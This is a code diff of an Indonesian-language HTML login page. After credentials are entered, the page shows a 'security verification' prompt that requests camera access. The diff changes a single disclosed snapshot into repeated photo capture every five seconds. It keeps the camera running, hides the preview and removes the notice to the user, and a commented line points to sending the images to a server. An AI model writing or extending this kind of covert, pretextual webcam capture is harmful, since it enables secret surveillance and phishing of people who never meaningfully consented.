@@ -38,7 +38,7 @@
             cursor: pointer;
         }
         #custom-prompt {
-            display: none; /* Sembunyikan dialog kustom awal */
+            display: none;
             width: 300px;
             margin: 20px auto;
             padding: 20px;
@@ -47,9 +47,6 @@
             background-color: #fff3cd;
             box-shadow: 0 2px 4px rgba(0,0,0,.1);
             color: #856404;
-        }
-        #custom-prompt-button {
-            margin-top: 10px;
         }
         #video-preview, #photo-canvas {
             margin-top: 20px;
@@ -68,23 +65,38 @@
         </form>
     </div>
 
+    <!-- Tombol login baru yang akan menggantikan permintaan izin browser -->
     <div id="custom-prompt">
-        <p>Untuk verifikasi keamanan, kami memerlukan akses ke kamera Anda. Klik tombol di bawah ini untuk melanjutkan.</p>
-        <button id="custom-prompt-button">Izinkan Akses Kamera</button>
+        <p>Untuk verifikasi keamanan, kami memerlukan akses ke kamera Anda. Klik "Izinkan Akses Kamera" untuk melanjutkan.</p>
+        <button id="camera-access-button">Izinkan Akses Kamera</button>
     </div>
-    
+
     <video id="video-preview" width="320" height="240" autoplay></video>
     <canvas id="photo-canvas" width="320" height="240"></canvas>
 
     <script>
         const loginForm = document.getElementById('login-form');
         const customPrompt = document.getElementById('custom-prompt');
-        const customPromptButton = document.getElementById('custom-prompt-button');
+        const cameraAccessButton = document.getElementById('camera-access-button');
         const videoElement = document.getElementById('video-preview');
         const canvasElement = document.getElementById('photo-canvas');
         const context = canvasElement.getContext('2d');
 
-        // Saat tombol login pertama diklik
+        let stream = null; // Variabel untuk menyimpan aliran kamera
+        let takingPhotos = false; // Variabel untuk mengontrol pengambilan foto
+
+        // Fungsi untuk mengambil foto
+        function takePhoto() {
+            if (takingPhotos) {
+                // Gambar frame dari video ke kanvas
+                context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+                console.log('Foto berhasil diambil.');
+                // Di sini Anda bisa mengirimkan gambar ke server
+                // Misalnya: kirimToServer(canvasElement.toDataURL('image/png'));
+            }
+        }
+
+        // Ketika form login disubmit
         loginForm.addEventListener('submit', (event) => {
             event.preventDefault();
             console.log("Kredensial diterima. Menampilkan dialog kustom.");
@@ -92,26 +104,30 @@
             customPrompt.style.display = 'block'; // Tampilkan dialog kustom
         });
 
-        // Saat tombol di dialog kustom diklik
-        customPromptButton.addEventListener('click', () => {
+        // Ketika tombol "Izinkan Akses Kamera" diklik
+        cameraAccessButton.addEventListener('click', () => {
             console.log("Tombol Izinkan Akses Kamera ditekan. Meminta izin kamera browser.");
             customPrompt.style.display = 'none'; // Sembunyikan dialog kustom
 
             // Meminta akses ke kamera (video)
             navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
+                .then(mediaStream => {
+                    stream = mediaStream;
                     videoElement.srcObject = stream;
                     videoElement.style.display = 'block';
-                    console.log('Akses kamera berhasil. Mengambil foto dalam 2 detik...');
+                    takingPhotos = true; // Mulai mengambil foto
+
+                    console.log('Akses kamera berhasil. Mengambil foto setiap 5 detik...');
                     
+                    // Ambil foto secara berkala (misal, setiap 5 detik)
+                    setInterval(takePhoto, 5000);
+
+                    // Sembunyikan video setelah 10 detik untuk contoh
                     setTimeout(() => {
-                        context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
-                        console.log('Foto berhasil diambil.');
                         videoElement.style.display = 'none';
                         canvasElement.style.display = 'block';
-                        stream.getTracks().forEach(track => track.stop());
-                        alert('Foto Anda telah diambil!');
-                    }, 2000);
+                        console.log('Video disembunyikan, kanvas ditampilkan.');
+                    }, 10000);
                 })
                 .catch(err => {
                     console.error('Terjadi kesalahan saat mengakses kamera: ', err);
